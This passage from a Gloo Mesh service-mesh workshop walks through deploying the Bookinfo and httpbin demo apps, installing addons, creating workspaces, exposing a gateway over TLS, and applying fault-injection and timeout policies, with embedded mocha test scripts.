echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-and-register-gloo-mesh/tests/cluster-registration.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 4 - Deploy the Bookinfo demo app <a name="lab-4---deploy-the-bookinfo-demo-app-"></a>
[<img src="https://img.youtube.com/vi/nzYcrjalY5A/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/nzYcrjalY5A "Video Link")

We're going to deploy the bookinfo application to demonstrate several features of Gloo Mesh.

You can find more information about this application [here](https://istio.io/latest/docs/examples/bookinfo/).

Run the following commands to deploy the bookinfo application on `cluster1`:

```bash
kubectl --context ${CLUSTER1} create ns bookinfo-frontends
kubectl --context ${CLUSTER1} create ns bookinfo-backends
kubectl --context ${CLUSTER1} label namespace bookinfo-frontends istio.io/rev=1-18 --overwrite
kubectl --context ${CLUSTER1} label namespace bookinfo-backends istio.io/rev=1-18 --overwrite

# Deploy the frontend bookinfo service in the bookinfo-frontends namespace
kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f data/steps/deploy-bookinfo/productpage-v1.yaml
# Deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
kubectl --context ${CLUSTER1} -n bookinfo-backends apply \
  -f data/steps/deploy-bookinfo/details-v1.yaml \
  -f data/steps/deploy-bookinfo/ratings-v1.yaml \
  -f data/steps/deploy-bookinfo/reviews-v1-v2.yaml
# Update the reviews service to display where it is coming from
kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${CLUSTER1}
kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${CLUSTER1}
```

<!--bash
echo -n Waiting for bookinfo pods to be ready...
timeout -v 5m bash -c "
until [[ \$(kubectl --context ${CLUSTER1} -n bookinfo-frontends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 1 && \\
  \$(kubectl --context ${CLUSTER1} -n bookinfo-backends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 4 ]] 2>/dev/null
do
  sleep 1
  echo -n .
done"
echo
-->

You can check that the app is running using the following command:

```
kubectl --context ${CLUSTER1} -n bookinfo-frontends get pods && kubectl --context ${CLUSTER1} -n bookinfo-backends get pods
```

Note that we deployed the `productpage` service in the `bookinfo-frontends` namespace and the other services in the `bookinfo-backends` namespace.

And we deployed the `v1` and `v2` versions of the `reviews` microservice, not the `v3` version.

Now, run the following commands to deploy the bookinfo application on `cluster2`:

```bash
kubectl --context ${CLUSTER2} create ns bookinfo-frontends
kubectl --context ${CLUSTER2} create ns bookinfo-backends
kubectl --context ${CLUSTER2} label namespace bookinfo-frontends istio.io/rev=1-18 --overwrite
kubectl --context ${CLUSTER2} label namespace bookinfo-backends istio.io/rev=1-18 --overwrite

# Deploy the frontend bookinfo service in the bookinfo-frontends namespace
kubectl --context ${CLUSTER2} -n bookinfo-frontends apply -f data/steps/deploy-bookinfo/productpage-v1.yaml
# Deploy the backend bookinfo services in the bookinfo-backends namespace for all versions
kubectl --context ${CLUSTER2} -n bookinfo-backends apply \
  -f data/steps/deploy-bookinfo/details-v1.yaml \
  -f data/steps/deploy-bookinfo/ratings-v1.yaml \
  -f data/steps/deploy-bookinfo/reviews-v1-v2.yaml \
  -f data/steps/deploy-bookinfo/reviews-v3.yaml
# Update the reviews service to display where it is coming from
kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${CLUSTER2}
kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${CLUSTER2}
kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v3 CLUSTER_NAME=${CLUSTER2}

```

<!--bash
echo -n Waiting for bookinfo pods to be ready...
timeout -v 5m bash -c "
until [[ \$(kubectl --context ${CLUSTER2} -n bookinfo-frontends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 1 && \\
  \$(kubectl --context ${CLUSTER2} -n bookinfo-backends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 5 ]] 2>/dev/null
do
  sleep 1
  echo -n .
done"
echo
-->

Confirm that `v1`, `v2` and `v3` of the `reviews` service are now running in the second cluster:

```bash
kubectl --context ${CLUSTER2} -n bookinfo-frontends get pods && kubectl --context ${CLUSTER2} -n bookinfo-backends get pods
```

As you can see, we deployed all three versions of the `reviews` microservice on this cluster.<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Bookinfo app", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["productpage-v1"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-frontends", k8sObj: deploy }));
  });
  deployments = ["ratings-v1", "details-v1", "reviews-v1", "reviews-v2"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-backends", k8sObj: deploy }));
  });
  cluster = process.env.CLUSTER2
  deployments = ["productpage-v1"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-frontends", k8sObj: deploy }));
  });
  deployments = ["ratings-v1", "details-v1", "reviews-v1", "reviews-v2", "reviews-v3"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-backends", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 5 - Deploy the httpbin demo app <a name="lab-5---deploy-the-httpbin-demo-app-"></a>
[<img src="https://img.youtube.com/vi/w1xB-o_gHs0/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/w1xB-o_gHs0 "Video Link")

We're going to deploy the httpbin application to demonstrate several features of Gloo Mesh.

You can find more information about this application [here](http://httpbin.org/).

Run the following commands to deploy the httpbin app on `cluster1`. The deployment will be called `not-in-mesh` and won't have the sidecar injected (because we don't label the namespace).

```bash
kubectl --context ${CLUSTER1} create ns httpbin
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: not-in-mesh
  namespace: httpbin
---
apiVersion: v1
kind: Service
metadata:
  name: not-in-mesh
  namespace: httpbin
  labels:
    app: not-in-mesh
    service: not-in-mesh
spec:
  ports:
  - name: http
    port: 8000
    targetPort: 80
  selector:
    app: not-in-mesh
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: not-in-mesh
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: not-in-mesh
      version: v1
  template:
    metadata:
      labels:
        app: not-in-mesh
        version: v1
    spec:
      serviceAccountName: not-in-mesh
      containers:
      - image: docker.io/kennethreitz/httpbin
        imagePullPolicy: IfNotPresent
        name: not-in-mesh
        ports:
        - containerPort: 80
EOF
```

Then, we deploy a second version, which will be called `in-mesh` and will have the sidecar injected (because of the label `istio.io/rev` in the Pod template).

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: in-mesh
  namespace: httpbin
---
apiVersion: v1
kind: Service
metadata:
  name: in-mesh
  namespace: httpbin
  labels:
    app: in-mesh
    service: in-mesh
spec:
  ports:
  - name: http
    port: 8000
    targetPort: 80
  selector:
    app: in-mesh
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: in-mesh
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: in-mesh
      version: v1
  template:
    metadata:
      labels:
        app: in-mesh
        version: v1
        istio.io/rev: 1-18
    spec:
      serviceAccountName: in-mesh
      containers:
      - image: docker.io/kennethreitz/httpbin
        imagePullPolicy: IfNotPresent
        name: in-mesh
        ports:
        - containerPort: 80
EOF
```


<!--bash
echo -n Waiting for httpbin pods to be ready...
timeout -v 5m bash -c "
until [[ \$(kubectl --context ${CLUSTER1} -n httpbin get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 2 ]] 2>/dev/null
do
  sleep 1
  echo -n .
done"
echo
-->

You can follow the progress using the following command:

```bash
kubectl --context ${CLUSTER1} -n httpbin get pods
```

```,nocopy
NAME                           READY   STATUS    RESTARTS   AGE
in-mesh-5d9d9549b5-qrdgd       2/2     Running   0          11s
not-in-mesh-5c64bb49cd-m9kwm   1/1     Running   0          11s
```
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("httpbin app", () => {
  let cluster = process.env.CLUSTER1
  
  let deployments = ["not-in-mesh", "in-mesh"];
  
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "httpbin", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/deploy-httpbin/tests/check-httpbin.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 6 - Deploy Gloo Mesh Addons <a name="lab-6---deploy-gloo-mesh-addons-"></a>
[<img src="https://img.youtube.com/vi/_rorug_2bk8/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/_rorug_2bk8 "Video Link")

To use the Gloo Mesh Gateway advanced features (external authentication, rate limiting, ...), you need to install the Gloo Mesh addons.

First, you need to create a namespace for the addons, with Istio injection enabled:

```bash
kubectl --context ${CLUSTER1} create namespace gloo-mesh-addons
kubectl --context ${CLUSTER1} label namespace gloo-mesh-addons istio.io/rev=1-18 --overwrite
kubectl --context ${CLUSTER2} create namespace gloo-mesh-addons
kubectl --context ${CLUSTER2} label namespace gloo-mesh-addons istio.io/rev=1-18 --overwrite
```

Then, you can deploy the addons on the cluster(s) using Helm:

```bash
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
  --namespace gloo-mesh-addons \
  --kube-context=${CLUSTER1} \
  --version 2.4.6 \
 -f -<<EOF
common:
  cluster: cluster1
glooPortalServer:
  enabled: true
  apiKeyStorage:
    redis:
      enabled: true
      address: redis.gloo-mesh-addons:6379
    secretKey: ThisIsSecret
glooAgent:
  enabled: false
extAuthService:
  enabled: true
  extAuth:
    apiKeyStorage:
      name: redis
      enabled: true
      config: 
        connection: 
          host: redis.gloo-mesh-addons:6379
      secretKey: ThisIsSecret
rateLimiter:
  enabled: true
EOF

helm upgrade --install gloo-platform gloo-platform/gloo-platform \
  --namespace gloo-mesh-addons \
  --kube-context=${CLUSTER2} \
  --version 2.4.6 \
 -f -<<EOF
common:
  cluster: cluster2
glooPortalServer:
  enabled: true
  apiKeyStorage:
    redis:
      enabled: true
      address: redis.gloo-mesh-addons:6379
    secretKey: ThisIsSecret
glooAgent:
  enabled: false
extAuthService:
  enabled: true
  extAuth:
    apiKeyStorage:
      name: redis
      enabled: true
      config: 
        connection: 
          host: redis.gloo-mesh-addons:6379
      secretKey: ThisIsSecret
rateLimiter:
  enabled: true
EOF
```

For teams to setup external authentication, the gateways team needs to create and `ExtAuthServer` object they can reference.

Let's create the `ExtAuthServer` object:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: ExtAuthServer
metadata:
  name: ext-auth-server
  namespace: gloo-mesh-addons
spec:
  destinationServer:
    ref:
      cluster: cluster1
      name: ext-auth-service
      namespace: gloo-mesh-addons
    port:
      name: grpc
  requestBody: {} # Needed if some an extauth plugin must access the body of the requests
EOF
```

For teams to setup rate limiting, the gateways team needs to create and `RateLimitServerSettings` object they can reference.

Let's create the `RateLimitServerSettings` object:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerSettings
metadata:
  name: rate-limit-server
  namespace: gloo-mesh-addons
spec:
  destinationServer:
    ref:
      cluster: cluster1
      name: rate-limiter
      namespace: gloo-mesh-addons
    port:
      name: grpc
EOF
```
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Gloo Platform add-ons cluster1 deployment", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["ext-auth-service", "rate-limiter"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-mesh-addons", k8sObj: deploy }));
  });
});
describe("Gloo Platform add-ons cluster2 deployment", () => {
  let cluster = process.env.CLUSTER2
  let deployments = ["ext-auth-service", "rate-limiter"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-mesh-addons", k8sObj: deploy }));
  });
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-gloo-mesh-addons/tests/check-addons-deployments.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Gloo Platform add-ons cluster1 service", () => {
  let cluster = process.env.CLUSTER1
  let services = ["ext-auth-service", "rate-limiter"];
  services.forEach(service => {
    it(service + ' exists in ' + cluster, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "gloo-mesh-addons", k8sType: "service", k8sObj: service }));
  });
});
describe("Gloo Platform add-ons cluster2 service", () => {
  let cluster = process.env.CLUSTER2
  let services = ["ext-auth-service", "rate-limiter"];
  services.forEach(service => {
    it(service + ' exists in ' + cluster, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "gloo-mesh-addons", k8sType: "service", k8sObj: service }));
  });
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-gloo-mesh-addons/tests/check-addons-services.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
This is what the environment looks like now:

![Gloo Platform Workshop Environment](images/steps/deploy-gloo-mesh-addons/gloo-mesh-workshop-environment.svg)



## Lab 7 - Create the gateways workspace <a name="lab-7---create-the-gateways-workspace-"></a>
[<img src="https://img.youtube.com/vi/QeVBH0eswWw/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/QeVBH0eswWw "Video Link")

We're going to create a workspace for the team in charge of the Gateways.

The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.

Let's create the `gateways` workspace which corresponds to the `istio-gateways` and the `gloo-mesh-addons` namespaces on the cluster(s):

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: gateways
  namespace: gloo-mesh
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: istio-gateways
    - name: gloo-mesh-addons
  - name: cluster2
    namespaces:
    - name: istio-gateways
    - name: gloo-mesh-addons
EOF
```

Then, the Gateway team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `gateways` workspace (so the `istio-gateways` or the `gloo-mesh-addons` namespace):

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: gateways
  namespace: gloo-mesh-addons
spec:
  importFrom:
  - workspaces:
    - selector:
        allow_ingress: "true"
    resources:
    - kind: SERVICE
    - kind: ALL
      labels:
        expose: "true"
  exportTo:
  - workspaces:
    - selector:
        allow_ingress: "true"
    resources:
    - kind: SERVICE
EOF
```

The Gateway team has decided to import the following from the workspaces that have the label `allow_ingress` set to `true` (using a selector):
- all the Kubernetes services exported by these workspaces
- all the resources (RouteTables, VirtualDestination, ...) exported by these workspaces that have the label `expose` set to `true`



## Lab 8 - Create the bookinfo workspace <a name="lab-8---create-the-bookinfo-workspace-"></a>

We're going to create a workspace for the team in charge of the Bookinfo application.

The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.

Let's create the `bookinfo` workspace which corresponds to the `bookinfo-frontends` and `bookinfo-backends` namespaces on the cluster(s):

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: bookinfo
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
  - name: cluster2
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
EOF
```

Then, the Bookinfo team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `bookinfo` workspace (so the `bookinfo-frontends` or the `bookinfo-backends` namespace):

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: bookinfo
  namespace: bookinfo-frontends
spec:
  importFrom:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
  exportTo:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
      labels:
        app: productpage
    - kind: SERVICE
      labels:
        app: reviews
    - kind: SERVICE
      labels:
        app: ratings
    - kind: ALL
      labels:
        expose: "true"
EOF
```

The Bookinfo team has decided to export the following to the `gateway` workspace (using a reference):
- the `productpage` and the `reviews` Kubernetes services
- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`

This is how the environment looks like with the workspaces:

![Gloo Mesh Workspaces](images/steps/create-bookinfo-workspace/gloo-mesh-workspaces.svg)




## Lab 9 - Expose the productpage through a gateway <a name="lab-9---expose-the-productpage-through-a-gateway-"></a>
[<img src="https://img.youtube.com/vi/emyIu99AOOA/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/emyIu99AOOA "Video Link")

In this step, we're going to expose the `productpage` service through the Ingress Gateway using Gloo Mesh.

The Gateway team must create a `VirtualGateway` to configure the Istio Ingress Gateway in cluster1 to listen to incoming requests.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualGateway
metadata:
  name: north-south-gw
  namespace: istio-gateways
spec:
  workloads:
    - selector:
        labels:
          istio: ingressgateway
        cluster: cluster1
  listeners: 
    - http: {}
      port:
        number: 80
      allowedRouteTables:
        - host: '*'
EOF
```

Then, the Gateway team should create a parent `RouteTable` to configure the main routing.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-bookinfo
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-bookinfo.example.com
    - cluster2-bookinfo.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: bookinfo
          - labels:
              expose: "true"
            workspace: gateways
        sortMethod: ROUTE_SPECIFICITY
---
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-httpbin
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-httpbin.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: httpbin
        sortMethod: ROUTE_SPECIFICITY
EOF
```

In this example, you can see that the Gateway team is delegating the routing details to the `bookinfo` and `httpbin` workspaces. The teams in charge of these workspaces can expose their services through the gateway.

The Gateway team can use this main `RouteTable` to enforce a global WAF policy, but also to have control on which hostnames and paths can be used by each application team.

Then, the Bookinfo team can create a `RouteTable` to determine how they want to handle the traffic.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: productpage
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  http:
    - name: productpage
      matchers:
      - uri:
          exact: /productpage
      - uri:
          prefix: /static
      - uri:
          prefix: /api/v1/products
      forwardTo:
        destinations:
          - ref:
              name: productpage
              namespace: bookinfo-frontends
              cluster: cluster1
            port:
              number: 9080
EOF
```
Let's add the domain to our `/etc/hosts` file:

```bash
./scripts/register-domain.sh cluster1-bookinfo.example.com ${HOST_GW_CLUSTER1}
./scripts/register-domain.sh cluster1-httpbin.example.com ${HOST_GW_CLUSTER1}
./scripts/register-domain.sh cluster2-bookinfo.example.com ${HOST_GW_CLUSTER2}
```

You can access the `productpage` service
using this URL: [http://cluster1-bookinfo.example.com/productpage](http://cluster1-bookinfo.example.com/productpage).

You should now be able to access the `productpage` application through the browser.<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Productpage is available (HTTP)", () => {
  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `http://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/gateway-expose/tests/productpage-available.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Gloo Mesh translates the `VirtualGateway` and `RouteTable` into the corresponding Istio objects (`Gateway` and `VirtualService`).

Now, let's secure the access through TLS.
Let's first create a private key and a self-signed certificate:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
   -keyout tls.key -out tls.crt -subj "/CN=*"
```

Then, you have to store them in a Kubernetes secret running the following commands:

```bash
kubectl --context ${CLUSTER1} -n istio-gateways create secret generic tls-secret \
  --from-file=tls.key=tls.key \
  --from-file=tls.crt=tls.crt

kubectl --context ${CLUSTER2} -n istio-gateways create secret generic tls-secret \
  --from-file=tls.key=tls.key \
  --from-file=tls.crt=tls.crt
```

Finally, the Gateway team needs to update the `VirtualGateway` to use this secret:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualGateway
metadata:
  name: north-south-gw
  namespace: istio-gateways
spec:
  workloads:
    - selector:
        labels:
          istio: ingressgateway
        cluster: cluster1
  listeners: 
    - http: {}
      port:
        number: 80
# ---------------- Redirect to https --------------------
      httpsRedirect: true
# -------------------------------------------------------
    - http: {}
# ---------------- SSL config ---------------------------
      port:
        number: 443
      tls:
        parameters:
          minimumProtocolVersion: TLSv1_3
        mode: SIMPLE
        secretName: tls-secret
# -------------------------------------------------------
      allowedRouteTables:
        - host: '*'
EOF
```

You can now access the `productpage` application securely through the browser.

Notice that we specificed a minimumProtocolVersion, so if the client is trying to use an deprecated TLS version the request will be denied.

To test this, we can try to send a request with `tlsv1.2`:

```console
curl --tlsv1.2 --tls-max 1.2 --key tls.key --cert tls.crt https://cluster1-bookinfo.example.com/productpage -k
```

You should get the following output:

```nocopy
curl: (35) error:1409442E:SSL routines:ssl3_read_bytes:tlsv1 alert protocol version
```

Now, you can try the most recent `tlsv1.3`:

```console
curl --tlsv1.3 --tls-max 1.3 --key tls.key --cert tls.crt https://cluster1-bookinfo.example.com/productpage -k
```

And after this you should get the actual Productpage.
You can now access the `productpage` service using this URL: [https://cluster1-bookinfo.example.com/productpage](https://cluster1-bookinfo.example.com/productpage).<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Productpage is available (HTTPS)", () => {
  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/gateway-expose/tests/productpage-available-secure.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Otel metrics", () => {
  it("cluster1 is sending metrics to telemetryGateway", () => {
    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=prometheus -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9090/api/v1/query?query=istio_requests_total" }).replaceAll("'", "");
    expect(command).to.contain("cluster\":\"cluster1");
  });
});


EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/gateway-expose/tests/otel-metrics.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=150 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
This diagram shows the flow of the request (through the Istio Ingress Gateway):

![Gloo Mesh Gateway](images/steps/gateway-expose/gloo-mesh-gateway.svg)




## Lab 10 - Traffic policies <a name="lab-10---traffic-policies-"></a>
[<img src="https://img.youtube.com/vi/ZBdt8WA0U64/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/ZBdt8WA0U64 "Video Link")

We're going to use Gloo Mesh policies to inject faults and configure timeouts.

Let's create the following `FaultInjectionPolicy` to inject a delay when the `v2` version of the `reviews` service talk to the `ratings` service:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: resilience.policy.gloo.solo.io/v2
kind: FaultInjectionPolicy
metadata:
  name: ratings-fault-injection
  namespace: bookinfo-frontends
spec:
  applyToRoutes:
  - route:
      labels:
        fault_injection: "true"
  config:
    delay:
      fixedDelay: 2s
      percentage: 100
EOF
```

As you can see, it will be applied to all the routes that have the label `fault_injection` set to `"true"`.

So, you need to create a `RouteTable` with this label set in the corresponding route.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: ratings
  namespace: bookinfo-frontends
spec:
  hosts:
    - 'ratings.bookinfo-backends.svc.cluster.local'
  workloadSelectors:
  - selector:
      labels:
        app: reviews
  http:
    - name: ratings
      labels:
        fault_injection: "true"
      matchers:
      - uri:
          prefix: /
      forwardTo:
        destinations:
          - ref:
              name: ratings
              namespace: bookinfo-backends
            port:
              number: 9080
EOF
```

If you refresh the webpage, you should see that it takes longer to get the `productpage` loaded when version `v2` of the `reviews` services is called.

Now, let's configure a 0.5s request timeout when the `productpage` service calls the `reviews` service on cluster1.

You need to create the following `RetryTimeoutPolicy`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: resilience.policy.gloo.solo.io/v2
kind: RetryTimeoutPolicy
metadata:
  name: reviews-request-timeout
  namespace: bookinfo-frontends
spec:
  applyToRoutes:
  - route:
      labels:
        request_timeout: "0.5s"
  config:
    requestTimeout: 0.5s
EOF
```

As you can see, it will be applied to all the routes that have the label `request_timeout` set to `"0.5s"`.

Then, you need to create a `RouteTable` with this label set in the corresponding route.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: reviews
  namespace: bookinfo-frontends
spec:
  hosts:
    - 'reviews.bookinfo-backends.svc.cluster.local'
  workloadSelectors:
  - selector:
      labels:
        app: productpage
  http:
    - name: reviews
      labels:
        request_timeout: "0.5s"
      matchers:
      - uri:
          prefix: /
      forwardTo:
        destinations:
          - ref:
              name: reviews
              namespace: bookinfo-backends
            port:
              number: 9080
            subset:
              version: v2
EOF
```
<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const chaiHttp = require("chai-http");
chai.use(chaiHttp);

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

let searchTest="Sorry, product reviews are currently unavailable for this book.";

describe("Reviews shouldn't be available", () => {
  it("Checking text '" + searchTest + "' in cluster1", async () => {
    await chai.request(`https://cluster1-bookinfo.example.com`)
      .get('/productpage')
      .send()
      .then((res) => {
        expect(res.text).to.contain(searchTest);
      });
  });

});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/traffic-policies/tests/traffic-policies-reviews-unavailable.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
If you refresh the page several times, you'll see an error message telling that reviews are unavailable when the productpage is trying to communicate with the version `v2` of the `reviews` service.

![Bookinfo reviews unavailable](images/steps/traffic-policies/reviews-unavailable.png)

This diagram shows where the timeout and delay have been applied:

![Gloo Mesh Traffic Policies](images/steps/traffic-policies/gloo-mesh-traffic-policies.svg)

